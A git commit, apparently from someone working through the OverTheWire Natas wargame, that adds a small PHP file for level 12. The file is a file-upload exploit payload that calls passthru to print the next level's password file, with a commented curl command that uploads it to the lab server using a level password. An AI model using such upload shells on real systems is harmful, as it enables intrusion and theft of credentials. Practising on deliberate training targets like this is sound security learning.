35f673ee012d4a6fc4b94e4db474fcab4e5f0327
Thor <tryvard@gmail.com>
2021-12-08 08:57:07 +0100

    At level 13

---
+++ natas/logs/natas12.php
@@ -0,0 +1,4 @@
+<?php echo passthru('cat /etc/natas_webpass/natas13');
+/*curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=natas12.php" -F "uploadedfile=@logs/nat│
+as12.php" http://natas12.natas.labs.overthewire.org/ */
+ ?>
